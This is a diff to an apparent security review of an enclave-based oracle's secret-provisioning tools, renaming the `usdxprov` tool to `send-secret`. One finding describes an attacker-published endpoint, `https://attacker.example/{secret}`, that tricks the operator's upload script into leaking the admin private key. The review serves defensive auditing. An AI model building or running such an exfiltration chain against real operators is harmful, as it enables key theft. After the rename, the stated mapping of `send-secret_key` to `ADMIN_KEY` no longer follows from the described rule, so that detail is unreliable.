@@ -134,7 +134,7 @@ operator host; and a supply-chain position over the images and modules.
 | SR-30 | Low | S | B | Replay window after restart: versions are in-memory; the 1 h freshness is the only bar |
 | SR-31 | Low | S | B | `resolveURL` is a prefix check: loopback, link-local and userinfo hosts pass; denylist charset |
 | SR-32 | Low | R | B | `Open()` is all-or-nothing per group even when quorum is met without the missing provider |
-| SR-33 | Low | S | B | `usdxprov -tee` optional; unpinned runs trust a plain-HTTP `/info` for the encryption key |
+| SR-33 | Low | S | B | `send-secret -tee` optional; unpinned runs trust a plain-HTTP `/info` for the encryption key |
 | SR-34 | Low | S | B | Upload scripts export every secret into all child processes; here-string key splitting |
 | SR-35 | Low | R | B | `envVarFor` collisions; only `hex_api_key` skipped, so `hex_cash_url` is prompted for |
 | SR-36 | Low | S | E | `oracle-status.sh` puts the deployment key on a command line |
@@ -360,18 +360,18 @@ name="$(printf '%s' "$1" | tr 'a-z' 'A-Z' | tr -c 'A-Z0-9_' '_')"
 ...
 if [ -n "${!var:-}" ]; then return; fi        # ask_secret: already set → use it
 ...
-USDXPROV_VALUE="${!var}" "$BIN_DIR/usdxprov" build ...
+SECRET_VALUE="${!var}" "$BIN_DIR/send-secret" build ...
 ```
 
 **What.** The list of refs to upload is the machine's `missingSecretRefs`, read from
 `/state` via the proxy's `/info`. Each ref is upper-cased into an environment variable
 name and, if that variable is already set, its value is used as the credential without a
-prompt. Nothing restricts a `SecretRef` in SET_ENDPOINTS to a safe alphabet, so `usdxprov_key`
-maps to `USDXPROV_KEY`, the variable holding the operator's admin private key;
-`usdxprov_api_key`, `usdxprov_keys`, `aws_secret_access_key` and `path` work the same way.
+prompt. Nothing restricts a `SecretRef` in SET_ENDPOINTS to a safe alphabet, so `send-secret_key`
+maps to `ADMIN_KEY`, the variable holding the operator's admin private key;
+`send-secret_api_key`, `send-secret_keys`, `aws_secret_access_key` and `path` work the same way.
 
 **Scenario.** A SET_ENDPOINTS carrying a PUBLIC endpoint `https://attacker.example/{secret}`
-with `secret: "usdxprov_key"` makes the script encrypt the admin key to the enclave, sign
+with `secret: "send-secret_key"` makes the script encrypt the admin key to the enclave, sign
 it with the operator's own admin keys and submit it; unknown refs are accepted by the
 store, and on the next `Open()` the value is substituted into the attacker's URL and sent
 over TLS. The full chain needs a malicious publisher (governance is trusted), so this is
@@ -421,11 +421,11 @@ missing, instead of refusing the publication. Keep the `ApplySecret` direction a
 
 ### SR-13 · Medium · R — no tool can produce a `hex_cash_url` envelope
 
-**Where.** `tools/cmd/usdxprov/main.go:104,145`, `tools/cmd/usdxprov/flags.go:31-46`,
+**Where.** `tools/cmd/send-secret/main.go:104,145`, `tools/cmd/send-secret/flags.go:31-46`,
 `internal/provisioning/store/abi.go:88-95,112`, `tools/pkg/oraclepayload/oraclepayload.go:237`.
 
 The private URL's plaintext is `abi.encode(bytes32 salt, string url)`, which always
-contains zero bytes. `usdxprov build` takes the value as a string from an environment
+contains zero bytes. `send-secret build` takes the value as a string from an environment
 variable or a flag, neither of which can carry NUL. `EncodePrivateURL` exists in both
 modules but no command calls it; `upload-rpc-keys.sh` and `upload-hex-key.sh` do not
 handle the ref; `docs/usdx-oracle-production-setup.md` never mentions it. The machine
@@ -433,12 +433,12 @@ therefore always lists `hex_cash_url` as missing, never reports `ready: true`, a
 cash-less permanently (correct but under-reporting backing, so the price can only be lower
 than it should be).
 
-**Fix.** Add a `-value-file` or `-value-hex` input to `usdxprov build`, or a
+**Fix.** Add a `-value-file` or `-value-hex` input to `send-secret build`, or a
 `-private-url <url> -salt <hex>` mode that calls `EncodePrivateURL`; have the hex-key
 script (backing role) upload it; document the step.
 
-**Status.** Fixed after the review. `usdxprov build -ref hex_cash_url` derives the blob
-from `HEX_CASH_URL` and `HEX_CASH_SALT` and refuses a string value; `usdxprov commit`
+**Status.** Fixed after the review. `send-secret build -ref hex_cash_url` derives the blob
+from `HEX_CASH_URL` and `HEX_CASH_SALT` and refuses a string value; `send-secret commit`
 prints the matching `urlHash`. `publish-local.sh endpoints` commits the `hex_cash` group
 to the URL from `.env`, generating and recording the salt, and `upload-hex-key.sh` uploads
 both refs from the same variables.
@@ -494,9 +494,9 @@ and one key outstanding, no price is produced.
 
 **Fix.** Skip unresolved providers and fail only when fewer than `Threshold` remain.
 
-### SR-33 · Low · S — `usdxprov -tee` is optional
+### SR-33 · Low · S — `send-secret -tee` is optional
 
-**Where.** `tools/cmd/usdxprov/main.go:126-142`, `:422-423`.
+**Where.** `tools/cmd/send-secret/main.go:126-142`, `:422-423`.
 
 Without `-tee`, the tool encrypts to whatever public key `/info` returns, fetched over plain
 HTTP by default. The scripts pass the attested id when `verify-tee` produced one; a run by
@@ -530,7 +530,7 @@ ref in `config.BackingRefs()`.
 
 ### SR-51 · Info — admins blind-sign a hash
 
-`tools/cmd/usdxprov/main.go:223` signs `TextHash(keccak256(body))`. A hardware wallet shows an
+`tools/cmd/send-secret/main.go:223` signs `TextHash(keccak256(body))`. A hardware wallet shows an
 opaque hash, so the signer cannot see ref, version or teeId. EIP-712 typed data would.
 
 ### SR-54 · Info — version burnt before install; dead trim
@@ -736,7 +736,7 @@ attestation" and then signs `addTeeVersion` with the extension owner key using t
 on the extension, which is the on-chain anchor `verify-tee` later relies on.
 
 **Fix.** Use `GetCodeHashAndPlatform(teeInfo)` and its return values, or require an explicit
-`-code-hash` obtained out of band.
+`-codeHash` obtained out of band.
 
 ### SR-16 · Medium · R — readiness report signer is never bound to a machine
 
@@ -978,7 +978,7 @@ advisories fixed in 1.26.6. The ones that touch this code's actual behaviour:
 | GO-2026-6089 | `net/http` | the extension's `ListenAndServe` | Missing `ReadHeaderTimeout` on the h2c check; the same server that SR-06 leaves without timeouts |
 | GO-2026-6090 | `crypto/tls` | TLS client to Hex and providers; local-stack proxy server | Post-handshake message limit |
 | GO-2026-6218 | `net/url` | backing client, tools HTTP | Quadratic `resolvePath`; URLs are governance-published, low |
-| GO-2026-5026 | `net/http` | backing client, teenode client, usdxprov | Punycode label handling |
+| GO-2026-5026 | `net/http` | backing client, teenode client, send-secret | Punycode label handling |
 | GO-2026-5972 | `encoding/asn1` | certificate parsing paths | Recursion depth |
 | GO-2026-6091 | `html/template` | tools only, via the proxy's `init.Init` | Not in the enclave binary |
 
